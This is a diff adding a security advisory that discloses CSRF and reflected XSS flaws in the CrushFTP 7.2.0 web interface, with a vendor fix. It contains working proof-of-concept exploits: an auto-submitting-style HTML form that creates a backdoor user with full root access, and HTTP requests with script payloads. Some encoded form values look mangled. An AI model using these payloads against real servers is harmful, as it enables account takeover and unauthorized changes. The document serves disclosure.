@@ -1,0 +1,132 @@
+========================================================
+ I. Overview
+ ========================================================
+ Multiple CSRF & Cross-Site Scripting (XSS) vulnerabilities have been identified in
+ Crushftp 7.2.0 (Web Interface) on default configuration. These vulnerabilities allows
+ an attacker to gain control over valid user accounts, perform operations
+ on their behalf, redirect them to malicious sites, steal their credentials,
+ and more.
+ ========================================================
+ II. Severity
+ ========================================================
+ Rating: Medium
+ Remote: Yes
+ Authentication Require: Yes
+ ========================================================
+ III. Vendor's Description of Application
+ ========================================================
+ CrushFTP is a robust file transfer server that makes it easy to setup secure connections with your users.
+'Crush' comes from the built-in zip methods in CrushFTP. They allow for downloading files in compressed formats in-stream, 
+or even automatically expanding zip files as they are received in-stream. This is called ZipStreaming and can greatly accelerate 
+the transfer of many types of files.
+Secure management is web based allowing you the ability to manage and monitor the server from anywhere, or with almost any device. 
+Easy in place server upgrades without complicated installers. Runs as a daemon, or Windows service with no need for a local GUI.
+CrushFTP is watching out for you by detecting common hack attempts and robots which scan for weak passwords. It will automatically 
+protect you against DDoS attacks. No need for you to do anything as CrushFTP will automatically ban these IPs to prevent wasted logging and CPU usage. 
+This keeps your server secure from unwanted abuse.
+User management includes inheritance, groups, and virtual file systems. If you want simple user management, 
+it can be as easy as just making a folder with a specific name and nothing else. 
+Think about how easily you can delegate user administration with CrushFTP's role based administration and event configuration. 
+http://www.crushftp.com/index.html
+
+ ========================================================
+ IV. Vulnerability Details & Exploit
+ ========================================================
+
+ 1) Multiple CSRF Vulnerabilities (Web Management interface - Default Config) 
+
+ a) An attacker may add/delete/modify user's accounts 
+ b) May change all configuration settings 
+
+Request Method: POST
+Location: /WebInterface/fuction/
+
+Proof of Concept:- 
+
+<html>
+
+ <body>
+ <form action="http://127.0.0.1:8080/WebInterface/function/" method="POST">
+ <input type="hidden" name="command" value="setUserItem" />
+ <input type="hidden" name="data&&95;action" value="new" />
+ <input type="hidden" name="serverGroup" value="MainUsers" />
+ <input type="hidden" name="username" value="Hacker" />
+ <input type="hidden" name="user" value="<&&63;xml&&32;version&&61;"1&&46;0"&&32;encoding&&61;"UTF&&45;8"&&63;><user&&32;type&&61;"properties"><username>Hacker<&&47;username><password>123456<&&47;password><max&&95;logins>0<&&47;max&&95;logins><root&&95;dir>&&47;<&&47;root&&95;dir><&&47;user>" />
+ <input type="hidden" name="xmlItem" value="user" />
+ <input type="hidden" name="vfs&&95;items" value="<&&63;xml&&32;version&&61;"1&&46;0"&&32;encoding&&61;"UTF&&45;8"&&63;><vfs&&32;type&&61;"properties"><&&47;vfs>" />
+ <input type="hidden" name="permissions" value="<&&63;xml&&32;version&&61;"1&&46;0"&&32;encoding&&61;"UTF&&45;8"&&63;><permissions&&32;type&&61;"properties"><item&&32;name&&61;"&&47;">&&40;read&&41;&&40;write&&41;&&40;view&&41;&&40;resume&&41;<&&47;item><&&47;permissions>" />
+ <input type="submit" value="Submit request" />
+ </form>
+ </body>
+</html>
+
+2) Multiple Cross-Site Scripting (Web Interface - Default Config)
+
+Type: Reflected
+Request Method: POST 
+Location: /WebInterface/function/ 
+Parameter: vfs_items
+Values: <?xml version="XSS PAYLOAD" encoding="XSS PAYLOAD"> 
+ vfs_items = <?xml version="XSS PAYLOAD" encoding="XSS PAYLOAD"> 
+
+
+Proof of Concept:
+
+POST /WebInterface/function/ HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1:8080/WebInterface/UserManager/index.html
+Content-Length: 656
+Cookie: XXXXXXXXXXXXXXXXXXXXX
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+command=setUserItem&data_action=new&serverGroup=MainUsers&username=test&user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cusername%3Etest2%3C%2Fusername%3E%3Cpassword%3Etest2%3C%2Fpassword%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3C%2Fuser%3E&xmlItem=user&vfs_items=%3C%3Fxml+version%3D%221.0<a%20xmlns:a%3d'http://www.w3.org/1999/xhtml'><a:body%20onload%3d'alert(1)'/></a>%22+encoding%3D%22UTF-8%22%3F%3E%3Cvfs+type%3D%22properties%22%3E%3C%2Fvfs%3E&permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cpermissions+type%3D%22properties%22%3E%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%3C%2Fpermissions%3E
+
+
+Type: Reflected
+Request Method: GET 
+Location: /WebInterface/function/ 
+Parameter: path
+Values: <script>alert(1)<%2fscript>
+ path=%<script>alert(1)<%2fscript>
+
+
+GET /WebInterface/function/?command=getXMLListing&format=JSONOBJ&path=%<script>alert(1)<%2fscript>&random=0.3300707341372783 HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1:8080/
+Cookie: XXXXXXXXXXXXXXXXXXXXXXXX
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+ ========================================================
+ VI. Affected Systems
+ ========================================================
+Software: Crushftp (Web Interface)
+Version: 7.2.0 Build : 147 < 7.3
+Configuration: Default
+ ========================================================
+ VII. Vendor Response/Solution
+ ========================================================
+
+ Vendor Contacted : 02/12/2015
+ Vendor Response : 02/12/2015
+ Solution : upgrade to 7.3 or change <csrf>true</csrf> in prefs.xml 
+
+ ========================================================
+ VIII. Credits
+ ========================================================
+ Discovered by Rehan Ahmed
+ knight_rehan@hotmail.com                 
